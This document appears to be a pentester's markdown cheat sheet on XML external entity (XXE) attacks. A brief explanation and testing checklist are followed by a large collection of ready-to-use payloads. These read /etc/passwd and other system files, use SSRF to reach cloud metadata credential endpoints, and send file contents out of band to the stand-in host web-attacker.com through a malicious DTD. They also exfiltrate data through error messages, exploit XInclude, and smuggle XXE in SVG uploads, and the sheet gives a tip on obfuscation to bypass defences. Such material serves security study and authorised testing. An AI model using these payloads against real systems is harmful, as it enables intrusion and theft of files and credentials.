# XML external entities
> XML external entities are a type of custom entity whose definition is located outside of the DTD 
> where they are declared.

The declaration of an external entity uses the `SYSTEM` keyword and must specify a URL from which the value of the entity should be loaded. For example:
`<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>`
The URL can use the `file://` protocol, and so external entities can be loaded from file. For example: `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>`
## XML Parameter Entities
Sometimes, XXE attacks using regular entities are blocked, due to some input validation by the application or some hardening of the XML parser that is being used. In this situation, you might be able to use XML parameter entities are a special kind of XML entity which can only be referenced elsewhere within the DTD. 
For present purposes, you only need to know two things. First, the declaration of an XML parameter entity includes the percent character before the entity name:
`<!ENTITY % myparameterentity "my parameter entity value" >`

And second, parameter entities are referenced using the percent character instead of the usual ampersand: `%myparameterentity;`

## Test Cases (mini Checklist)
Manually testing for XXE vulnerabilities generally involves:
- Testing for [file retrieval](https://portswigger.net/web-security/xxe#exploiting-xxe-to-retrieve-files) by defining an external entity based on a well-known operating system file and using that entity in data that is returned in the application's response.
- Testing for [blind XXE vulnerabilities](https://portswigger.net/web-security/xxe/blind) by defining an external entity based on a URL to a system that you control, and monitoring for interactions with that system. [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) is perfect for this purpose.
- Testing for vulnerable inclusion of user-supplied non-XML data within a server-side XML document by using an [XInclude attack](https://portswigger.net/web-security/xxe#xinclude-attacks) to try to retrieve a well-known operating system file.
- Test for XXE in the normal params not just the XML format (XInclude attacks)
- Try `Content-Type: text/xml` 

> Note
> Keep in mind that XML is just a data transfer format. Make sure you also test any XML-based functionality for other vulnerabilities like [XSS](https://portswigger.net/web-security/cross-site-scripting) and SQL injection. You may need to encode your payload using XML escape sequences to avoid breaking the syntax, but you may also be able to use this to [obfuscate your attack](https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings#obfuscation-via-xml-encoding) in order to bypass weak defenses.

# POCs
## Normal
```xml
[*] to retrieve files
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY 0xHunter SYSTEM "file:///etc/passwd"> ]> <stockCheck><productId>&hunter;</productId></stockCheck>

-----------------------------------------------------------------------------------

[*] to perform SSRF
<!DOCTYPE test [ <!ENTITY Hunter SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
&Hunter; 
```

## BLIND 
```xml
[*] Detecating blind XXE

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>

-----------------------------------------------------------------------------------

[*] blind XXE using out-of-band detection via XML parameter entities

<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>

-----------------------------------------------------------------------------------

[*] blind XXE using out-of-band detection via XML parameter entities

<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;

<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
u can target a file like /etc/hostname instead of passwd due to parsing problems
also try use FTP instead of HTTP

-----------------------------------------------------------------------------------

[*] Exploiting blind XXE to retrieve data via error messages

<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;

<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>

-----------------------------------------------------------------------------------

[*] Exploiting blind XXE by repurposing a local DTD

<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>

---------------------------------------------------------------------------------

[*] Enumrating Local DTD files on the server

<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> %local_dtd;]>
----------------------------------------------------------------------------------

[*] XInclude attacks
<foo xmlns:xi="http://www.w3.org/2001/XInclude"> <xi:include parse="text" href="file:///etc/passwd"/></foo>

-----------------------------------------------------------------------------------

[*] svg file upload to XXE

<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-size="16" x="0" y="16">&xxe;</text>
</svg>

Save it as svg file and upload it
```
